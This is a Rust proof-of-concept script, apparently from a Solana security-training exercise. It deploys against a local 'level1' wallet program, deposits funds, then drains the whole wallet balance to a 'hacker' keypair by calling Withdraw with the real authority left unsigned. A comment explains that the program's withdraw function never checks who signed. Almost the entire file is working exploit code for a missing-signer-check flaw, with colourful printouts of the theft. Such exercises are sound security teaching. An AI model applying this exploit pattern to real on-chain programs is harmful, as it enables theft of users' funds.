use std::{thread, time::Duration};
use kdam::prelude::*;
use owo_colors::OwoColorize;
use poc_framework::solana_program::pubkey::Pubkey;
use poc_framework::{keypair, RemoteEnvironment,};
use poc_framework::solana_sdk::system_program;
use poc_framework::solana_program::instruction::{AccountMeta, Instruction};
use poc_framework::solana_sdk::{
    signature::{read_keypair_file, Signer},
};

use poc_framework::solana_program::account_info;
use poc_framework::solana_sdk::bpf_loader_upgradeable::UpgradeableLoaderState;

use serde::de::DeserializeOwned;
use poc_framework::Environment;
use poc_framework::localhost_client;

use borsh::{BorshSerialize, BorshDeserialize};

// We use the same Structure created in the Smart Contract
#[derive(Debug, BorshDeserialize, BorshSerialize)]

pub enum WalletInstruction {
    Initialize,
    Deposit { amount: u64 },
    Withdraw { amount: u64 },
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
}

pub const WALLET_LEN: u64 = 32;

pub fn main() {
    let programa_keypair = read_keypair_file("./target/so/level1-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();
    let cliente1 = localhost_client();
    
    let hacker = keypair(1);
    let authority_info = keypair(2);

    /* Create the PDA */
    let (wallet_address, _) =
    Pubkey::find_program_address(&[&authority_info.pubkey().to_bytes()], &programa);

    /* First we create the accounts */
 
    let mut env = RemoteEnvironment::new_with_airdrop(cliente1, keypair(2), 10000000000);
            env.airdrop(hacker.pubkey(), 10000000000);
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false),
                        AccountMeta::new(authority_info.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Initialize.try_to_vec().unwrap(), 
                        }],
                        &[&authority_info],
                    );
            let wallet_address_info = env.get_account(wallet_address).unwrap();
            let auth_vault_address_info = env.get_account(authority_info.pubkey()).unwrap();

            println!("");
            println!("{}", "INITIALIZE & CREATE ACCOUNTS".bold().yellow());
            println!("");
            println!("{} {:?}", "Wallet info address: ".bold().blue(), wallet_address_info.blue());
            println!("");
            println!("{} {:?}", "Auth info address: ".bold().blue(), auth_vault_address_info.blue());
            println!("");
            println!("{} {:?}", "Wallet info deserialized data: ".bold().green(), 
            env.get_deserialized_account::<Wallet>(wallet_address).unwrap().green());
            println!("");
            println!("{}", "**************************".bright_blue().bold());
            println!("{}", "*        IMPORTANT       *".bright_blue().bold());
            println!("{}", "**************************".bright_blue().bold());
            println!("");
            println!("{}", "Check the results a little bit....".bold().yellow());      
            println!("");
            println!("");

            for _ in tqdm!(0..100) { thread::sleep(Duration::from_millis(70)); }
            println!("");   
            println!("");   
            
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false), //<- dest
                        AccountMeta::new(authority_info.pubkey(), true), //<- source 
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Deposit { amount: 10000 }.try_to_vec().unwrap(),
                    }],
                        &[&authority_info],
                    );
            let wallet_address_info = env.get_account(wallet_address).unwrap();
            let auth_address_info = env.get_account(authority_info.pubkey()).unwrap();

            let wallet_address_deser = env.get_deserialized_account::<Wallet>(wallet_address).unwrap();

            println!("");
            println!("{}", "TRANSFER".yellow().bold());
            println!("");
            println!("{} {} {} {}", "From: ".bold().red(), authority_info.pubkey().red(),
            " ---- > AMOUNT: 10000 ---- TO -->".bold().green(), wallet_address.blue());
            println!("");
            println!("{} {} {} {:?}", "Wallet address: ".bold().yellow(), wallet_address.yellow(), 
            "  Wallet address info: ".bold().blue(), wallet_address_info.blue());
            println!("");
            println!("{} {} {} {:?}", "Vault address: ".bold().yellow(), authority_info.pubkey().yellow(), 
            "  Authority address info: ".bold().blue(), auth_address_info.blue());
            println!("");
            println!("{} {:?}", 
            "Wallet address data deser with Wallet Struct: ".bold().green(), wallet_address_deser.green());

               /* Third we steal the money */
            println!("");
            println!("{}", "**************************".bright_blue().bold());
            println!("{}", "*        IMPORTANT       *".bright_blue().bold());
            println!("{}", "**************************".bright_blue().bold());
            println!("");
            println!("{}", "Check the results a little bit....".bold().yellow());      
            println!("");
            println!("");

            for _ in tqdm!(0..100) { thread::sleep(Duration::from_millis(40)); }
            println!("");   
            println!("");   
            println!("{}", "WITHDRAW FUNDS TO HACKER".bold().yellow());

            let steal_amount = env.get_account(wallet_address).unwrap().lamports;

            env.airdrop(hacker.pubkey(), 1000000);

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false), //<- source
                        AccountMeta::new(authority_info.pubkey(), false), //<-unsetting as signer
                        AccountMeta::new(hacker.pubkey(), true), /*<- destination, and we are setting as signer
                                                                 , but somebody has to sign, and the fn withdraw
                                                                 in processor.rs doesn't check who the signer is
                                                                 */
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Withdraw { amount: steal_amount }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );
            let hacker_address_info = env.get_account(hacker.pubkey()).unwrap();
            let vault_address_info = env.get_account(wallet_address);

            println!("{} {:?}", "Hacker info address: ".bold().blue(), hacker_address_info.blue());
            println!("");
            println!("{} {:?}", "Wallet address address does not exist anymore, because all the funds where stolen --> ".bold().red(), 
            vault_address_info.blue().bright_purple().bold().underline());

            let account = env.get_account(programa).expect("couldn't retrieve account");
            let upgradable: UpgradeableLoaderState = account.deserialize_data().unwrap();
            if let UpgradeableLoaderState::Program {
                programdata_address,
            } = upgradable {println!("{} {:?}", "The PROGRAM EXECUTABLE DATA Account for: "
            .bold().green(), programa.red());
            println!("");
            println!("{} {}", "Is this Address: ".bold().green(), programdata_address.red());
            println!("");
            println!("{} {:?}", "And its account info is: ".bold().green(), 
            env.get_account(programdata_address).unwrap().cyan());}
}